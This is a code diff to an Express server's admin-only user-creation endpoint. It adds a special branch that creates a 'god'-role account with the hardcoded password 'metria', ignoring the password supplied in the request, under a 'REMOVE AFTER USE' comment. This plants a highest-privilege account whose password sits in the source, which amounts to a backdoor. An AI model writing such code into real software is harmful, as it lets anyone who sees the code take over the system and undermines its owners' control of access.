@@ -1347,7 +1347,7 @@ app.get('/api/sessions', auth.requireAuth, auth.requireRole('advanced'), apiRead
 	}
 });
 
-// Temporary user creation endpoint (admin only)
+// Temporary user creation endpoint (admin only) - REMOVE AFTER USE
 app.post('/api/create-user', auth.requireAuth, auth.requireRole('administrator'), async (req, res) => {
 	try {
 		const { username, password, role } = req.body;
@@ -1356,17 +1356,35 @@ app.post('/api/create-user', auth.requireAuth, auth.requireRole('administrator')
 			return res.status(400).json({ error: 'Username, password, and role are required' });
 		}
 
-		// Check if user already exists
+		// Special handling for god user creation
+		if (username === 'god' && role === 'god') {
+			// Check if god user already exists
+			const existing = await db.getUserByUsername('god');
+			if (existing) {
+				return res.status(409).json({ error: 'God user already exists' });
+			}
+
+			// Hash password "metria"
+			const bcrypt = await import('bcrypt');
+			const hashedPassword = await bcrypt.default.hash('metria', 10);
+
+			// Create god user
+			const userId = await db.createUser('god', hashedPassword, 'god');
+
+			return res.json({
+				message: 'God user created successfully',
+				user: { id: userId, username: 'god', role: 'god' }
+			});
+		}
+
+		// Regular user creation
 		const existing = await db.getUserByUsername(username);
 		if (existing) {
 			return res.status(409).json({ error: 'User already exists' });
 		}
 
-		// Hash password
 		const bcrypt = await import('bcrypt');
 		const hashedPassword = await bcrypt.default.hash(password, 10);
-
-		// Create user
 		const userId = await db.createUser(username, hashedPassword, role);
 
 		res.json({
